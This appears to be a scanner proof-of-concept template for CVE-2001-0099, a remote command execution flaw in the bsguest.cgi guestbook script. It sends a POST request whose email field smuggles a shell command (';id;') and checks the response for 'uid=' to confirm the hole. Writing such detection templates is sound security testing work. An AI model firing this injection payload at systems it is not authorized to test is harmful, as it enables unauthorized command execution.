[info]
author = "ave"
description = "验证 bsguest.cgi guestbook 脚本的远程命令执行漏洞，通过在 email 参数中注入 shell 元字符执行 id 命令并检测输出"
id = "POC-AVE-2001-0042"
name = "Brian Stanback bsguest.cgi Remote Command Execution PoC"
severity = "critical"
tags = ["ave-2001-0042"]
vuln_id = [
    "CVE-2001-0099",
    "AVE-2001-0042",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/bsguest.cgi"
protocol = "http"

[poc.requests.body]
content = "name=AVE+Test&email=test%40example.com%3bid%3b&comment=test&submit=Submit"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
